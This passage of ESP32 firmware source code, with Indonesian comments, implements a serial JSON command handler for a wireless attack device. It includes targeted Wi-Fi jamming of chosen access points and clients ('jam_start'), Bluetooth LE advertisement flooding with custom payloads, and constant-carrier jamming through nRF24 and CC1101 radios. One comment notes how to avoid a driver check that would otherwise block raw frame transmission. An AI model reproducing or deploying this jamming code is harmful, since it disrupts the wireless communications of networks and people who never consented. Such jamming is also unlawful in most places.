  if (getInt(p, "pin_nrf_cs", 0, 34, &x)) { g_cfg.pinNrfCs = (uint8_t)x; changed = true; }
  if (getInt(p, "pin_spi_sck", 0, 34, &x)) { g_cfg.pinSpiSck = (uint8_t)x; changed = true; }
  if (getInt(p, "pin_spi_miso", 0, 34, &x)) { g_cfg.pinSpiMiso = (uint8_t)x; changed = true; }
  if (getInt(p, "pin_spi_mosi", 0, 34, &x)) { g_cfg.pinSpiMosi = (uint8_t)x; changed = true; }

  (void)changed;
  if (!g_cfg.hop && g_curCh != g_cfg.channel) {
    if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = g_cfg.channel;
    }
  }
  ack(true, "params applied", "set");
  emitConfig();
}

static void handleLine(const char *line) {
  DeserializationError err = deserializeJson(s_rx, line);
  if (err) {
    ack(false, "bad json", "");
    return;
  }

  const char *cmd = s_rx["cmd"] | "";

  if (!strcmp(cmd, "ping")) {
    ack(true, "pong", cmd);
    return;
  }
  if (!strcmp(cmd, "status")) {
    ack(true, "ok", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "config")) {
    ack(true, "ok", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "set")) {
    applyParams(s_rx["params"].as<JsonObject>());
    return;
  }
  if (!strcmp(cmd, "targets")) {
    uint16_t n = 0;
    if (s_rx["targets"].is<JsonArray>()) n = setTargetsFromJson(s_rx["targets"].as<JsonArray>());
    ack(true, "targets set", cmd);
    emitConfig();
    return;
  }
  if (!strcmp(cmd, "clear")) {
    uint16_t n = 0;
    for (uint16_t i = 0; i < MAX_APS; i++) if (g_aps[i].used) { g_aps[i] = ApEntry(); n++; }
    for (uint16_t i = 0; i < MAX_STAS; i++) if (g_stas[i].used) { g_stas[i] = StaEntry(); n++; }
    s_uniqueAp = s_uniqueSta = 0;
    ack(true, "tables cleared", cmd);
    return;
  }
  if (!strcmp(cmd, "jam_start")) {
    if (s_rx["targets"].is<JsonArray>()) setTargetsFromJson(s_rx["targets"].as<JsonArray>());
    if (s_rx["client_targets"].is<JsonArray>()) setStaTargetsFromJson(s_rx["client_targets"].as<JsonArray>());

    // Kalau target pernah terlihat, ikuti channel-nya supaya TX kena.
    if (!g_cfg.hop) {
      for (uint16_t i = 0; i < MAX_TARGETS; i++) {
        if (!g_targets[i].used) continue;
        for (uint16_t j = 0; j < MAX_APS; j++) {
          if (g_aps[j].used && macEq(g_aps[j].bssid, g_targets[i].bssid) && g_aps[j].ch >= 1 && g_aps[j].ch <= 13) {
            g_cfg.channel = g_aps[j].ch;
            if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) g_curCh = g_cfg.channel;
            break;
          }
        }
        break;
      }
    }

    g_jamming = true;
    s_burstLeft = 0;
    s_tCursor = s_cCursor = 0;
    ack(true, "jamming", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "jam_stop")) {
    g_jamming = false;
    s_burstLeft = 0;
    ack(true, "stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "ble_start")) {
    if (s_rx["params"].is<JsonObject>()) applyParams(s_rx["params"].as<JsonObject>());
    const char *hex = s_rx["payload"] | "";
    uint8_t n = parseHexBytes(hex, g_bleCustom, sizeof(g_bleCustom));
    if (n) { g_bleCustomLen = n; g_cfg.bleMode = 4; }
    bleInit();
    g_bleRunning = true;
    g_bleAdvActive = false;
    g_bleLast = 0;
    ack(true, "ble flooding", cmd);
    emitConfig();
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "ble_stop")) {
    g_bleRunning = false;
    if (g_bleInited) NimBLEDevice::getAdvertising()->stop();
    ack(true, "ble stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "radio_start")) {
    if (s_rx["params"].is<JsonObject>()) applyParams(s_rx["params"].as<JsonObject>());
    g_radioErrors = 0;
    g_ccReady = false;
    g_nrfReady = false;
    if (g_cfg.radioModule & 1) g_ccReady = radioInitCc();
    if (g_cfg.radioModule & 2) g_nrfReady = radioInitNrf();
    g_radioRunning = true;
    ack(g_ccReady || g_nrfReady, "radio started", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "radio_stop")) {
    g_radioRunning = false;
    if (g_nrf && g_nrfReady) g_nrf->stopConstCarrier();
    ack(true, "radio stopped", cmd);
    emitStatus();
    return;
  }
  if (!strcmp(cmd, "reset")) {
    g_jamming = false;
    g_bleRunning = false;
    if (g_bleInited) NimBLEDevice::getAdvertising()->stop();
    g_radioRunning = false;
    if (g_nrf && g_nrfReady) g_nrf->stopConstCarrier();
    g_cfg = Config();
    clearTargets();
    ack(true, "reset", cmd);
    emitConfig();
    emitStatus();
    return;
  }

  ack(false, "unknown cmd", cmd);
}

/* ---- serial link ------------------------------------------------------- */

static char s_rxLine[RX_LINE_MAX];
static size_t s_rxLen = 0;

static void linkPoll() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (s_rxLen) {
        s_rxLine[s_rxLen] = 0;
        handleLine(s_rxLine);
        s_rxLen = 0;
      }
    } else if (s_rxLen < RX_LINE_MAX - 1) {
      s_rxLine[s_rxLen++] = c;
    } else {
      s_rxLen = 0;
      g_rxDrops++;
    }
  }
}

/* ---- setup / loop ------------------------------------------------------ */

void setup() {
  Serial.begin(SERIAL_BAUD);
  uint32_t t0 = millis();
  while (!Serial && (millis() - t0) < 3000) delay(20);

  // STA tanpa asosiasi: tidak ada koneksi yang bisa bentrok dengan TX raw.
  // Jangan hidupkan softAP — itu memicu pengecekan addr2 di driver (258).
  WiFi.mode(WIFI_STA);
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

  wifi_promiscuous_filter_t flt = {};
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous_rx_cb(&sniffCb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE);

  JsonDocument hello;
  hello["type"]   = "hello";
  hello["fw"]     = FW_VERSION;
  hello["chip"]   = ESP.getChipModel();
  hello["serial"] = SERIAL_BAUD;
  hello["proto"]  = 2;
  sendJson(hello);

  emitConfig();
  emitStatus();
}

static uint32_t s_lastStats = 0;

void loop() {
  linkPoll();
  hopTick();

  for (;;) {
    uint16_t t = s_tail.load(std::memory_order_relaxed);
    if (t == s_head.load(std::memory_order_acquire)) break;
    RawFrame &r = s_ring[t];
    if (r.kind == 1) processAp(r);
    else if (r.kind == 2) processSta(r);
    s_tail.store((uint16_t)((t + 1) % RING_LEN), std::memory_order_release);
  }

  jamTick();
  bleTick();
  radioTick();

  if (g_cfg.statsMs && (uint32_t)(millis() - s_lastStats) >= g_cfg.statsMs) {
    s_lastStats = millis();
    emitStatus();
  }

  delay(1);
}
